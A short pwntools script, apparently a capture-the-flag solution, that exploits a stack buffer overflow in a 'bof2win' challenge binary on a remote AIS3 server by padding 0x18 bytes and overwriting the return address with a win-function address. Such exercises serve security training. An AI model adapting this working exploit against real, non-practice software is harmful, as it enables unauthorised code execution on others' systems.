#!/usr/bin/python3

from pwn import *

context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./bof2win/share/bof2win')
r = remote('chals1.ais3.org', 12347)
get_the_flag = 0x000000000401216

# gdb.attach(r)

r.sendafter("What's your name?", b"A" * 0x18 + p64(get_the_flag))
r.interactive()